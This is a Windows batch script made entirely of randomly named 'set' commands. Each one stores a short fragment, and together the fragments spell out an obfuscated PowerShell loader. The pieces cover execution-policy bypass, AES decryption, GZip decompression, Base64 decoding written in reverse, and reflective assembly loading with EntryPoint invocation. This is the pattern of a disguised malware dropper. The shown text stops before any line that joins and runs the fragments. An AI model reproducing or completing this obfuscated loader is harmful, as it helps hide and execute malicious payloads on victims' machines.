@echo off
set "bgzGShPffV=Fina"
set "ykCbqOrMiJ=)($T"
set "muIENFHjiU=oint"
set "FTXTFwwVMe=[Sys"
set "DSXkGUgmEf=;$Jr"
set "YclQqfjwIJ=1..-"
set "XnnQtzQmqa=Comp"
set "lsDizaLSKT=se()"
set "iKhwGgcRKX=Secu"
set "VGmKWcAvKC=iron"
set "HNHVeLBMGN=('Tg"
set "ybQgEIAeMo=stem"
set "PCyBYrzTBe= = $"
set "nsrYkiZunU=lit("
set "zvsScduKDr=ose("
set "JQXsPxchUG=($hR"
set "oLuxUzzEge=elj."
set "AxPPVIAvbs= = N"
set "zwnaNTlIHx=();$"
set "CWmSEBgwRT=..-1"
set "iEktGYIKPg=F'[-"
set "hOyHRLCyWS=Syst"
set "advaJhwbfV=wScV"
set "IDKLHNGRUQ=ne);"
set "iyIFOjQqBP=lj, "
set "VktBNdPEbH=daeR"
set "oLtavTuzxa=d;$f"
set "UXltHHdczd=;$la"
set "lgaLzAeHpy=();$"
set "VOyOYHvYmU= if "
set "jLjFuQkEAI=vert"
set "qYSWOxgtlm= '')"
set "dbMfcVWJwi=ress"
set "wugbxCETkp=nage"
set "ofGigKiCDC=l5E7"
set "QFMZGeRfbQ=.Dis"
set "EvJsrKWFfg='[-1"
set "acrzQNBCas=FqWB"
set "hDWtJQSJXs=rity"
set "QPlMnVLBny=ptog"
set "JmfDfONnIT=bypa"
set "ZZqoLykXjm=lBlo"
set "yoofcstGHM=oryS"
set "uvuNggCJHY=em.C"
set "EixdSjxqoo=-4] "
set "FxWZPSzALs=3); "
set "CEwSEJFbAf=New-"
set "qvzPbymyJO=fore"
set "hqfxseVLXb=uC.T"
set "JqERbHIGug='gni"
set "BELTTJFfDT=Star"
set "PxyIiYULfi=)))"
set "UZjnwVIHis=16] "
set "upmjJgzuZp=W.En"
set "ZVsQEzsgDW=, (,"
set "lylXDEOafF=TfJy"
set "yabHKwMKyk=ring"
set "ejrowfMuJL=SbW "
set "EUVauhxzwo=$JSP"
set "CWXmNNUXND=$lae"
set "aXpVoXFIhH=ose("
set "oVkOZSqCYs=ach "
set "KXUiqWUpGI=Syst"
set "rLSLoukDEx=stem"
set "PgJApLPZPi=jb.D"
set "hKqAdJfExm=);$M"
set "ZVuqWtHELA=-ep "
set "nvVpZnRhEh=dj0C"
set "CuHgAOOSLX=tem."
set "ElOlVYgGqA= New"
set "xVCyZUKoqX=D = "
set "sYcqyDNhAM=-Obj"
set "eNBCVErgrL=k; }"
set "sMQZwBaFaq=.Mod"
set "ggOvDTjuYP=n ''"
set "CwrDOICkFr=Obje"
set "KjoLWOznfl=] -j"
set "PRaeOfGMQs=qWB."
set "nDjhuCkJsP='0Pg"
set "pvvRrFpIoM=.IO."
set "AxndRinVmI=;$Jr"
set "ozbOJaDJxu=('%*'"
set "pRhsFaHHwd=Invo"
set "wnyxmmjxMD=).Sp"
set "XOPaTGhida=oL'["
set "dYcldrlnWf=zuZI"
set "eBbkdrvyjW=.Dis"
set "hFvfnEeLsP=e = "
set "lZGRzyOlsV=ode]"
set "LYnCWngYis=df ="
set "ZQGWGeHcyE=ing("
set "tkheTZEGeJ=.Sec"
set "hrftYhLHlj== [S"
set "AjXdTlMgmD=vuC."
set "KpZUfFBuwy=pres"
set "CenZrLtCBw=$bKJ"
set "zqmfYGGFLj=ke($"
set "MSxUUHHIqi=ss -"
set "KdbrjGYPoD=pStr"
set "TxDOLaOKjE=ck($"
set "TBNrhoXkQZ=YxVw"
set "bZzRlqFsJk=.Com"
set "abXqNkYdWV=ypto"
set "KsNzBmgDlu=oin "
set "PgABOZIkXs=flec"
set "gzgcGvwgoC=ddin"
set "MDqxmrlOkR=f) {"
set "fYqKCDlpBQ=wScV"
set "JJKUSjuWXL=)($L"
set "twgPrjrNvp=eam("
set "uEkOftLGQn=raph"
set "NlggFNGFof=-1.."
set "jtfOBKMKFX=RmAx"
set "WYuRdaQGKX=[IO."
set "jRTPcIIPaP=fJyD"
set "SroJSHAdlr=L4Yi"
set "DCllaoiGSk=and "
set "TVhEpjHlTF= [Sy"
set "MlvWFjvvbo=gnir"
set "GBUhcdLKvk=[Sys"
set "PpjPcRUAiK=.Cry"
set "TZGHJQeBAE=Disp"
set "bRFAkvDOMu=m(, "
set "QtyedYrUft=$fwS"
set "zvbJagDScZ=TfJy"
set "EeeLuooSwq=y]::"
set "OxJgiyKSuI=eMVs"
set "fMQLLvFzVt=IA.T"
set "aplIkyjepJ=Stre"
set "xWvbgBxdLQ=.GZi"
set "YfKTOfgoQU=; };"
set "kwuxsvvywS=pher"
set "zKynIZKsLm=m.IO"
set "ChdFcLHzVb=gjYA"
set "nIHHZvZooq=ment"
set "wozTlqJOgH=[Env"
set "fQfUlwHJSR=PxEW"
set "qVYKsefdzg=:: '"
set "VYJtjUQCnE=m.IO"
set "eCjafrpgEx=::De"
set "RKqJuTbTuX=.Ass"
set "cCZilYCtEQ= = ["
set "efMvYyhVBu=Conv"
set "ZcNaJyQmJP=D, 0"
set "qzzjXipMzy=;$vF"
set "izWKYdwwRg=j = "
set "hkyAqINqKk=File"
set "IpicxkhXLK=rofi"
set "BWJvEhWCdk=JGT "
set "KJgfeKiGPm=stem"
set "yDpbawpWsu=]::C"
set "uXdYQFhiyu=T.Su"
set "cBFzpaEZBA=trea"
set "xeTCAYishY=JSPd"
set "AnkXYriDUg=le  "
set "THoWtHhlbf=:('g"
set "mjLiAjdPEo=S46e"
set "sintIRjoxB=zHhH"
set "CvreIGgHbi=ewLi"
set "TqwGespGrR=fjjb"
set "NIVbyjXFbH=New-"
set "UvmZdnobda=yste"
set "NNDOOeLjGO=IA);"
set "luuiqWwccR=ghSb"
set "jqvhAQXXao=brea"
set "DLxmuSapVE=ptor"
set "hxdZqBoysB=..-1"
set "sbmGsDCgiM=ion."
set "jJJtCgsqno=cV.I"
set "LsIvFmooip=wScV"
set "bRXDrZzWVd=oArr"
set "RSUWLEBDAq=6] -"
set "IcSqjHUEmh=n ''"
set "hkrEiSubRR=rt]:"
set "RfjNBeLYtJ=lael"
set "mRILvVOJux=sion"
set "xyPMosFXQZ=TfJy"
set "fvnwhjXXOu=ddin"
set "psmgHcMJhm=($hR"
set "UxdDsozIGh=ct S"
set "ILhxWRcNoW=ptog"
set "LxVxaRgTeO=);$f"
set "FdLYjJcEMw=yD);"
set "dSgbfxDWeQ=]::("
set "KxYZNaEXAP=);$f"
set "VRGpALZZnv=-nop"
set "GrlCCIYMzK=V = "
set "RhWYfVtMBk=-joi"
set "xLHDmRuWlu=vuC "
set "bMwieOrZxR=tS46"
set "CxlTHNjzPV=morF"
set "yBWiFpmZtV= = $"
set "DdnGMITqmV=bstr"
set "HTKaAHIKmk=comp"
set "DrGMsUaVBU=.-16"
set "ufiPUoHgBs=t Sy"
set "PFUmRFCogf=IA ="
set "ajPDZLSOsP=Obje"
set "MbcLuVOAbi=ress"
set "AGTRvmNmUa=ew-O"
